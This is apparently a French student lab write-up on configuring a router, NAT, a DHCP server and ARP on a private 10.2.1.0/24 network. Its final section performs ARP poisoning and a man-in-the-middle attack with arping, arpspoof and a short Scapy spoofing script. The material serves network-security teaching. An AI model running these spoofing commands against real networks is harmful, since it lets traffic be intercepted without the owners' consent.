# TP Réseaux : Configuration et Analyse

## 1. Routage

### Informations du Routeur
- **Nom** : `router.tp2.efrei`
- **IP** : `10.2.1.254/24`

### Étapes de Configuration du Routeur

#### Configuration de l'Interface Internet (DHCP)
```bash
sudo nano /etc/sysconfig/network-scripts/ifcfg-enp0s3
# Configuration :
DEVICE=enp0s3
NAME=internet
BOOTPROTO=dhcp
ONBOOT=yes
```
Redémarrez l'interface :
```bash
sudo systemctl restart network
```

#### Configuration de l'Interface LAN (Statique)
```bash
sudo nano /etc/sysconfig/network-scripts/ifcfg-enp0s8
# Configuration :
DEVICE=enp0s8
NAME=lan
BOOTPROTO=static
ONBOOT=yes
IPADDR=10.2.1.254
NETMASK=255.255.255.0
```
Redémarrez l'interface :
```bash
sudo systemctl restart network
```

#### Activation du Routage et NAT
```bash
sudo firewall-cmd --add-masquerade
sudo firewall-cmd --add-masquerade --permanent
sudo firewall-cmd --reload
```

### Vérification de la Connectivité Internet
- Commande ping vers une adresse externe :
```bash
ping 8.8.8.8
```

### Affichage des Interfaces Réseau
```bash
ip a
```

## 2. Configuration de `node1`

### Configuration IP Statique
- **IP** : `10.2.1.1/24`
- **Passerelle** : `10.2.1.254`

```bash
sudo ip addr add 10.2.1.1/24 dev enp0s3
sudo ip route add default via 10.2.1.254
```

### Vérification des Connexions
- Ping vers le routeur :
```bash
ping 10.2.1.254
```
- Ping vers Internet :
```bash
ping 8.8.8.8
```
- Traceroute pour vérifier le passage par le routeur :
```bash
traceroute 8.8.8.8
```

## 3. Serveur DHCP

### Configuration de `dhcp.tp2.efrei`
- **IP** : `10.2.1.253/24`
- **Passerelle** : `10.2.1.254`

#### Installation et Configuration
1. Installez le serveur DHCP :
   ```bash
   sudo yum install dhcp-server
   ```
2. Éditez la configuration :
   ```bash
   sudo nano /etc/dhcp/dhcpd.conf
   # Exemple de configuration :
   subnet 10.2.1.0 netmask 255.255.255.0 {
       range 10.2.1.10 10.2.1.50;
       option routers 10.2.1.254;
       option domain-name-servers 1.1.1.1;
   }
   ```
3. Redémarrez le service :
   ```bash
   sudo systemctl restart dhcpd
   ```

### Test DHCP sur `node1`
1. Supprimez la configuration IP statique précédente :
   ```bash
   sudo ip addr flush dev enp0s3
   ```
2. Configurez pour utiliser DHCP :
   ```bash
   sudo dhclient enp0s3
   ```
3. Vérifiez l'IP obtenue et la passerelle :
   ```bash
   ip a
   ip route
   ```
4. Testez la connectivité :
   ```bash
   ping 8.8.8.8
   ```

## 4. Table ARP

### Affichage sur le Routeur
- Vérifiez la table ARP :
```bash
ip neigh
```
- Si une entrée manque, effectuez un ping pour déclencher l'échange ARP :
```bash
ping 10.2.1.1
```

### Capture Wireshark
1. Lancez Wireshark sur le réseau concerné.
2. Filtrez pour `arp`.
3. Obtenez et exportez l'échange ARP (Request et Reply).

## 5. ARP Poisoning

### Modification de la Table ARP
1. Sur une machine attaquante, insérez une entrée ARP :
   ```bash
   sudo arping -U -s 10.2.1.254 -i enp0s3 10.2.1.1
   ```

### Mise en Place d'un MITM
1. Activez l'IPv4 forwarding sur la machine attaquante :
   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   ```
2. Lancez l'attaque avec `arpspoof` :
   ```bash
   sudo arpspoof -i enp0s3 -t 10.2.1.1 10.2.1.254
   ```

### Capture Wireshark
1. Filtrez pour les paquets ICMP et ARP.
2. Vérifiez que les pings transitent par l'attaquant.
3. Exportez la capture en fichier `.pcap`.

### Script Python avec Scapy
Créez un script Python pour l'attaque :
```python
from scapy.all import ARP, send

def spoof(target_ip, host_ip, target_mac, host_mac):
    packet = ARP(op=2, pdst=target_ip, psrc=host_ip, hwdst=target_mac)
    send(packet, verbose=False)

# Exemple : spoof('10.2.1.1', '10.2.1.254', '00:11:22:33:44:55', '66:77:88:99:AA:BB')
```

---
